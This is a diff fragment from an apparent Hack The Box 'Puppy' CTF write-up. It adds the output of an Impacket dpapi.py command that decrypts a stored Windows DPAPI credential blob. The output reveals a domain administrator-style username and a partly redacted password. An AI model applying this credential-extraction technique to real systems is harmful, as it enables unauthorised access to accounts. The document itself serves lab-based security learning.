@@ -464,3 +464,18 @@ Now we will use the Decrypted Key to get the password from Credentials blob
 dpapi.py credential -file ../../../HTB/Puppy/C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a5707{REDACTED}e9c84
 ```
 We have used the C8--- file as the credential file (From the blog)
+Output
+```bash
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2025-03-08 15:54:29
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=PUPPY.HTB
+Description : 
+Unknown     : 
+Username    : steph.cooper_adm
+Unknown     : Five{REDACTED}2025!
+```
